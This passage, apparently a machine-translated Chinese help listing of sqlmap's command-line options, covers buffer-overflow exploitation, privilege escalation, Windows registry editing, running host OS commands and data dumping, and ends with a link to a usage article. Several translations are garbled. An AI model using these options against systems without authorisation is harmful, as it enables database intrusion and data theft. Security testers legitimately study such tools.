    --os-bof            存储过程缓冲区溢出exploitation
    --priv-esc          数据库处理用户特权升级
    --msf-path=MSFPATH  地方道路Metasploit框架安装
    --tmp-path=TMPPATH  远程临时文件目录的绝对路径

  Windows注册表访问:
    这些选项可用于访问后端数据库管理系统Windows注册表

    --reg-read          读一个Windows注册表键值
    --reg-add           写一个Windows注册表键值数据
    --reg-del           删除一个Windows注册表键值
    --reg-key=REGKEY    Windows注册表键
    --reg-value=REGVAL  Windows注册表键 value
    --reg-data=REGDATA  Windows注册表键 value data
    --reg-type=REGTYPE  Windows注册表键 value type

  全体的:
    这些选项可用于设置一些常规工作参数

    -s SESSIONFILE      从一个存储加载会话(.sqlite)文件
    -t TRAFFICFILE      记录所有HTTP流量到一个文本文件中
    --answers=ANSWERS   预定义的答案(例如 "quit=N,follow=N")
    --base64=BASE64P..  包含Base64编码数据的参数(年代)
    --base64-safe       使用URL和文件名安全Base64字母表(RFC 4648)
    --batch             从来没有要求用户输入,使用默认的行为
    --binary-fields=..  结果字段有二进制值(例如 "digest")
    --check-internet    检查网络连接之前评估的目标
    --cleanup           清理的DBMS sqlmap特定UDF和表
    --crawl=CRAWLDEPTH  爬行网站从目标URL
    --crawl-exclude=..  Regexp排除页面爬行(例如 "logout")
    --csv-del=CSVDEL    (CSV输出中使用的分隔字符 (默认 ",")
    --charset=CHARSET   盲SQL注入字符集(例如 "0123456789abcdef")
    --dump-file=DUMP..  将数据存储到一个自定义文件
    --dump-format=DU..  了数据的格式(CSV(默认)、HTML或SQLITE)
    --encoding=ENCOD..  字符编码用于数据检索(例如GBK)
    --eta               预计到达时间为每个输出显示
    --flush-session     冲洗会话文件当前的目标
    --forms             解析和测试目标URL形式
    --fresh-queries     忽略查询结果存储在会话文件中
    --gpage=GOOGLEPAGE  使用指定页码的Google dork结果
    --har=HARFILE       记录所有HTTP流量HAR文件
    --hex               在数据检索使用十六进制转换
    --output-dir=OUT..  自定义输出目录路径
    --parse-errors      从响应解析和显示DBMS的错误消息
    --preprocess=PRE..  使用给定的脚本(s)预处理(请求)
    --postprocess=PO..  使用给定的脚本(s)后处理(响应)
    --repair            Redump条目有未知字符标记(?)
    --save=SAVECONFIG   保存选项来配置INI文件
    --scope=SCOPE       Regexp过滤目标
    --skip-heuristics   跳过启发式检测漏洞
    --skip-waf          跳过WAF/IPS保护的启发式检测
    --table-prefix=T..  前缀用于临时表(默认值: "sqlmap")
    --test-filter=TE..  按有效载荷和/或标题选择测试(例如 ROW)
    --test-skip=TEST..  按有效载荷和/或标题跳过测试(例如 BENCHMARK)
    --web-root=WEBROOT  Web服务器的文档根目录(例如 "/var/www")

  混杂的:
    这些选项不属于任何其他类别

    -z MNEMONICS        使用短助记符(例如 "flu,bat,ban,tec=EU")
    --alert=ALERT       运行主机操作系统命令(s) SQL注入时发现
    --beep              出现问题和/或发现漏洞时发出蜂鸣声
    --dependencies      检查丢失(可选)sqlmap依赖性
    --disable-coloring  禁用控制台输出颜色
    --list-tampers      显示列表可用夯的脚本
    --no-logging        禁用日志记录到一个文件
    --offline           在离线模式下工作(只使用会话数据)
    --purge             从sqlmap数据目录中安全地删除所有内容
    --results-file=R..  在多个目标模式下结果CSV文件的位置
    --shell             提示一个交互式sqlmap壳
    --tmp-dir=TMPDIR    本地目录用于存储临时文件
    --unstable          调整选项不稳定的连接
    --update            更新sqlmap
    --wizard            为新手用户简单的向导界面
```

文章参考：[Sqlmap使用方法总结](https://www.cnblogs.com/R3col/p/12452543.html)
